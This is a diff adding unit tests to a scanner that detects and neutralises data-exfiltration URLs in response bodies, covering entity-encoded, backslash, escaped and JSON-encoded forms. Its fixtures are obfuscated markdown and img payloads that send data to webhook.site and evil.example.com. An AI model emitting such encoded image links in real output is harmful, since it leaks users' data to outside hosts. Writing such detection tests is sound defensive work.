@@ -220,6 +220,78 @@ describe('scanResponseExfil', () => {
   })
 })
 
+// GHSA-less gap, #580: the scanner read a destination only when its raw text
+// began `http(s)://` or `//`. A browser normalises the text first (entities,
+// backslashes for slashes, tabs and newlines stripped, CommonMark escapes), so
+// each form below reached the same host unseen. Each is judged as the client
+// will resolve it, and the finding keeps the raw text the body really holds.
+describe('encoded destinations (#580)', () => {
+  const found = (t: string) => scanResponseExfil(t, isExfil).map(f => f.kind)
+
+  it('reads HTML entities in a markdown destination', () => {
+    expect(found('![x](https&#58;&#47;&#47;webhook.site/?d=1)')).toEqual(['markdown-image'])
+    expect(found('![x](https&#x3A;&#x2F;&#x2F;webhook.site/?d=1)')).toEqual(['markdown-image'])
+    expect(found('[x](https:&#47;&#47;webhook.site/?d=1)')).toEqual(['markdown-link'])
+  })
+
+  it('reads HTML entities in an img src', () => {
+    expect(found('<img src="&#x2F;&#x2F;webhook.site/?d=1">')).toEqual(['html-image'])
+  })
+
+  it('reads a backslash for a slash, the way the URL parser does for http(s)', () => {
+    expect(found('![x](https:\\webhook.site/?d=1)')).toEqual(['markdown-image'])
+    expect(found('![x](https:\\\\webhook.site/?d=1)')).toEqual(['markdown-image'])
+    // CommonMark reads `\\` as one escaped backslash before the URL parser sees
+    // it, so the destination is `\webhook.site`: a same-site path, not a host.
+    expect(found('![x](\\\\webhook.site/?d=1)')).toEqual([])
+    expect(found('<img src="https:\\webhook.site/?d=1">')).toEqual(['html-image'])
+  })
+
+  it('reads a CommonMark backslash escape in a destination', () => {
+    expect(found('![x](https:\\/\\/webhook.site/?d=1)')).toEqual(['markdown-image'])
+  })
+
+  it('strips a tab or newline from an img src, as the URL parser does', () => {
+    expect(found('<img src="ht\ttps://webhook.site/?d=1">')).toEqual(['html-image'])
+    expect(found('<img src="https://web\nhook.site/?d=1">')).toEqual(['html-image'])
+  })
+
+  it('reads an entity-encoded reference definition', () => {
+    expect(found('[r]: https&#58;//webhook.site/?d=1')).toEqual(['markdown-image'])
+  })
+
+  it('reads the same forms inside a JSON response body, where backslashes are doubled', () => {
+    const body = JSON.stringify({ content: [{ type: 'text', text: '![x](https:\\webhook.site/?d=1) and <img src="https:\\\\webhook.site/?d=2">' }] })
+    const f = scanResponseExfil(body, isExfil)
+    expect(f.map(x => x.kind)).toEqual(['markdown-image', 'html-image'])
+    expect(neutralizeExfil(body, f)).not.toContain('webhook.site')
+  })
+
+  it('reads a \\u escape in a JSON body, as a serializer writes a colon or slash', () => {
+    const body = '{"content":[{"type":"text","text":"![x](https\\u003a\\u002f\\u002fwebhook.site/?d=1)"}]}'
+    const f = scanResponseExfil(body, isExfil)
+    expect(f.map(x => x.kind)).toEqual(['markdown-image'])
+    expect(neutralizeExfil(body, f)).not.toContain('webhook.site')
+  })
+
+  it('does not flag an encoded relative or allowed destination', () => {
+    expect(scanResponseExfil('![x](&#x2F;docs&#x2F;a.png) <img src="&#x2F;img&#x2F;logo.png"> [r]: docs/x', isExfil)).toEqual([])
+    expect(scanResponseExfil('![x](https&#58;&#47;&#47;cdn.trusted.com/a.png)', isExfil)).toEqual([])
+  })
+
+  it('stays linear on 200 KB of encoded destinations', () => {
+    for (const filler of ['https&#58;', '\\\\', 'ht\t', '&#x2F;', '\\/']) {
+      const inline = '![x](' + filler.repeat(Math.ceil(200_000 / filler.length))
+      const tag = '<img src="' + filler.repeat(Math.ceil(200_000 / filler.length))
+      const started = Date.now()
+      scanResponseExfil(inline, isExfil)
+      scanResponseExfil(tag, isExfil)
+      scanResponseExfil(JSON.stringify({ text: inline + tag }), isExfil)
+      expect(Date.now() - started, filler).toBeLessThan(500)
+    }
+  })
+})
+
 describe('neutralizeExfil', () => {
   it('replaces the offending URL with an inert placeholder, keeping surrounding text', () => {
     const text = 'chart ![c](https://evil.example.com/c?d=secret) done'
